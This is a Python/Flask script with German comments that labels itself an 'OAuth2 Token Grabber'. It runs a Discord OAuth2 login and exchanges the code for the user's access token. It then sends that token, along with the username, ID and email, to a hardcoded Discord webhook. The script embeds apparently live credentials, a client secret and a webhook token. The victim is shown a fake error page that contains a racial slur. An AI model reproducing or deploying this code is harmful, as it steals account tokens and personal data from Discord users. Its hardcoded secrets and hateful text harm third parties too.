import requests
import webbrowser
from flask import Flask, request, jsonify
import threading
import time

# --- Konfiguration ---
# Daten aus dem Discord Developer Portal
CLIENT_ID = "1539075755634462802" 
CLIENT_SECRET = "meEt_Cq7nBZFWB80NNtu8ieH-XGKmzwn"
REDIRECT_URI = "http://localhost:8080/callback"  # Muss exakt mit der in Discord übereinstimmen

# Discord API Endpunkte
AUTH_URL = "https://discord.com/oauth2/authorize?client_id=1539075755634462802&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A8080%2Fcallback&scope=identify+email"
TOKEN_URL = "https://discord.com/api/oauth2/token"
USER_INFO_URL = "https://discord.com/api/v10/users/@me"

# Deine Webhook-URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1535443994195001516/OZ-NMOzQZihqoWswowQ_z9d-G4OYm8Gl_Di6wKoWbfhfiPEZ1OKSuDu2RyhZzWEKJSxC"
# --- Ende Konfiguration ---

# Flask-App für den Callback-Server
app = Flask(__name__)

@app.route('/callback')
def callback():
    """Diese Funktion wird aufgerufen, nachdem der Benutzer die Autorisierung erteilt hat."""
    auth_code = request.args.get('code')
    if not auth_code:
        return jsonify({"error": "Authorization code not found"}), 400

    print(f"[INFO] Autorisierungscode erhalten: {auth_code[:20]}...")
    
    # Tausche den Autorisierungscode gegen ein Access Token ein
    data = {
        'grant_type': 'authorization_code',
        'code': auth_code,
        'redirect_uri': REDIRECT_URI,
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    print("[INFO] Tausche Code gegen Access Token ein...")
    try:
        response = requests.post(TOKEN_URL, data=data, headers=headers, auth=(CLIENT_ID, CLIENT_SECRET))
        response.raise_for_status()  # Löst einen Fehler bei HTTP-Fehlercodes aus
        token_info = response.json()
        access_token = token_info['access_token']
        print("[ERFOLG] Access Token erhalten.")
    except requests.exceptions.RequestException as e:
        print(f"[FEHLER] Konnte Token nicht erhalten: {e}")
        return jsonify({"error": "Failed to get token", "details": str(e)}), 500

    # Hole Benutzerinformationen mit dem Access Token
    headers = {'Authorization': f'Bearer {access_token}'}
    print("[INFO] Hole Benutzerinformationen...")
    try:
        user_response = requests.get(USER_INFO_URL, headers=headers)
        user_response.raise_for_status()
        user_info = user_response.json()
        print("[ERFOLG] Benutzerinformationen erhalten.")
    except requests.exceptions.RequestException as e:
        print(f"[FEHLER] Konnte Benutzerinformationen nicht erhalten: {e}")
        return jsonify({"error": "Failed to get user info", "details": str(e)}), 500

    # Sende die Informationen an deinen Webhook
    send_to_webhook(user_info, access_token)

    # Gib eine Erfolgsmeldung im Browser aus
    return_html = """
    <h1>Erorr 404!</h1>
    <p>Nigger Join Discord. -https://discord.gg/WXMfmhb4U-</p>
    """
    return return_html

def send_to_webhook(user_info, token):
    """Sendet die Benutzerdaten und den Token an den Discord-Webhook."""
    if not WEBHOOK_URL or WEBHOOK_URL == "DEINE_DISCORD_WEBHOOK_URL_HIER":
        print("[FEHLER] Webhook-URL nicht konfiguriert. Daten nicht gesendet.")
        return

    username = f"{user_info.get('username')}#{user_info.get('discriminator')}"
    user_id = user_info.get('id')
    email = user_info.get('email', 'Nicht angegeben')
    is_verified = user_info.get('verified', False)
    
    embed = {
        "title": "Neuer Benutzer autorisiert!",
        "description": f"Ein Benutzer hat die Anwendung autorisiert und seine Daten wurden übermittelt.",
        "color": 5814783,  # Grüne Farbe
        "fields": [
            {"name": "Benutzername", "value": username, "inline": True},
            {"name": "Benutzer ID", "value": user_id, "inline": True},
            {"name": "E-Mail", "value": email, "inline": True},
            {"name": "Verifiziert", "value": "Ja" if is_verified else "Nein", "inline": True},
            {"name": "Access Token", "value": f"```{token}```", "inline": False}
        ],
        "footer": {"text": "OAuth2 Token Grabber"}
    }
    
    payload = {"embeds": [embed]}
    
    print(f"[INFO] Sende Daten von {username} an den Webhook...")
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
        print("[ERFOLG] Daten erfolgreich an Webhook gesendet.")
    except requests.exceptions.RequestException as e:
        print(f"[FEHLER] Konnte nicht an Webhook senden: {e}")

def run_flask_app():
    """Startet den Flask-Server im Hintergrund."""
    # Verwende einen anderen Port, um Konflikte zu vermeiden
    app.run(port=8080, debug=False, use_reloader=False)

if __name__ == "__main__":
    # Starte den Flask-Server in einem separaten Thread
    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.daemon = True
    flask_thread.start()

    # Warte kurz, um sicherzustellen, dass der Server gestartet ist
    time.sleep(1)

    # Öffne die Autorisierungs-URL im Standardbrowser
    auth_params = {
        'client_id': CLIENT_ID,
        'redirect_uri': REDIRECT_URI,
        'response_type': 'code',
        'scope': 'identify email'  # Passe die Scopes nach Bedarf an
    }
    auth_url = f"{AUTH_URL}?{requests.compat.urlencode(auth_params)}"
    print(f"[INFO] Öffne Autorisierungs-URL: {auth_url}")
    webbrowser.open(auth_url)

    # Halte das Hauptprogramm am Laufen, bis der Flask-Thread beendet wird
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] Beende das Programm.")